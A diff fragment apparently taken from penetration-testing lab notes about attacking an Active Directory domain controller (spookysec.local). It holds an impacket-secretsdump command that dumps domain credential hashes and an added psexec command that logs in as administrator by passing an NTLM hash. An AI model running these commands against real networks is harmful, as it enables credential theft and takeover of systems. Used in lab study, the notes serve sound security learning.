@@ -7,3 +7,5 @@ In scenarios where a domain controller is vulnerable to an LDAP null bind, retri
 --------------------------------------------------------------------------------
 
 impacket-secretsdump spookysec.local/backup:password@10.10.106.230 -just-dc
+
+psexec administrator@10.10.121.27 -hashes LMHASH:NTHASH
